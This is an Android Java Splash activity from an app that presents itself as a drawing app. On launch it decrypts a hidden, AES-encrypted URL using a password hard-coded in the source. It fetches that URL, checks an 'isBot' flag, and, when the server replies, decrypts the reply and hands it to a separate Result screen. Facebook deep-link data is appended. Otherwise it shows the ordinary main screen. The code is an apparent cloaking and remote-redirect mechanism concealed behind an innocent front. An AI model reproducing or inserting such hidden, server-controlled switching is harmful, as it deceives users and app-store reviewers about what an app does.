package com.iwantdraw.draw;

import androidx.appcompat.app.AppCompatActivity;
import androidx.preference.PreferenceManager;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;

import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.onesignal.OneSignal;
import com.scottyab.aescrypt.AESCrypt;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.security.GeneralSecurityException;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutionException;

public class Splash extends AppCompatActivity {

    private SharedPreferences sharedPreferences, preferences;
    private Check check;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        OneSignal.startInit(this)
                .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
                .unsubscribeWhenNotificationsAreDisabled(true)
                .init();

        setContentView(R.layout.activity_splash);

        sharedPreferences = getApplicationContext().getSharedPreferences("DATA", Context.MODE_PRIVATE);
        check = new Check();
        if (sharedPreferences.getBoolean("firstrun", true)) {
            check.check(this);
            sharedPreferences.edit().putBoolean("firstrun", false).apply();
        }

        preferences = PreferenceManager.getDefaultSharedPreferences(this);
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();
        String gamar = sharedPreferences.getString("param", "");
        assert gamar != null;
        if (!gamar.equals("")) {
            Intent intent = new Intent(this, Result.class);
            startActivity(intent);
            finish();
        } else if (isNetworkConnected()) {
            if(preferences.getBoolean("isBot", true)){
                reload();
            }else  if (isNetworkConnected()) {
                if (preferences.getBoolean("isBot", true)) {
                    reload();
                } else if (prodKox().length() > 7) {
                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            Intent intent = new Intent(Splash.this, Result.class);
                            intent.putExtra("key", encrB());
                            startActivity(intent);
                            finish();
                        }
                    }, 1000);
                    AppLinkData.fetchDeferredAppLinkData(this,
                            new AppLinkData.CompletionHandler() {
                                @Override
                                public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
                                    if (appLinkData != null) {
                                        Intent intent = new Intent();
                                        Uri targetUri = appLinkData.getTargetUri();
                                        assert targetUri != null;
                                        String ramap = encrB() + targetUri.toString().substring(6);
                                        intent.putExtra("key", ramap);
                                        finish();
                                    }
                                }
                            }
                    );
                } else {
                    reload();
                }
            }
        } else {
            reload();
        }
    }

    public boolean isNetworkConnected() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo ni = cm.getActiveNetworkInfo();
        if (ni == null) {
            return false;
        } else {
            return true;
        }
    }

    private void reload(){
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                Intent intent = new Intent(Splash.this, MainActivity.class);
                startActivity(intent);
                finish();
            }
        }, 2000);
    }

    private String prodKox() {
        String link = encr();
        ProdKoxTask task = new ProdKoxTask();
        try {
            String result = task.execute(link).get();
            return result;
        } catch (ExecutionException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        return "";
    }

    private String encr(){
        String messageAfterDecrypt = null;
        try {
            messageAfterDecrypt = AESCrypt.decrypt("daitedeneg", "ULixUoMuQf6x00+Gktr99E8GOY6jMHHoWPhiSl3MQmY5eHet226HyErdrlc5XQx+GH3v5LflsBE5NBRf9HYVtQ==");
        } catch (GeneralSecurityException e) {
        }
        return messageAfterDecrypt;
    }

    private String encrB(){
        String messageAfterDecrypt = null;
        try {
            messageAfterDecrypt = AESCrypt.decrypt("daitedeneg", prodKox());
        } catch (GeneralSecurityException e) {
        }
        return messageAfterDecrypt;
    }

    private static class ProdKoxTask extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... strings) {
            StringBuilder result = new StringBuilder();
            URL url;
            HttpURLConnection urlConnection = null;
            try {
                url = new URL(strings[0]);
                urlConnection = (HttpURLConnection) url.openConnection();
                InputStream in = urlConnection.getInputStream();
                InputStreamReader reader = new InputStreamReader(in);
                BufferedReader bufferedReader = new BufferedReader(reader);
                String line = bufferedReader.readLine();
                while (line != null) {
                    result.append(line);
                    line = bufferedReader.readLine();
                }
            } catch (MalformedURLException e) {
            } catch (IOException e) {
            } finally {
                if (urlConnection != null) {
                    urlConnection.disconnect();
                }
            }
            return result.toString();
        }
    }
}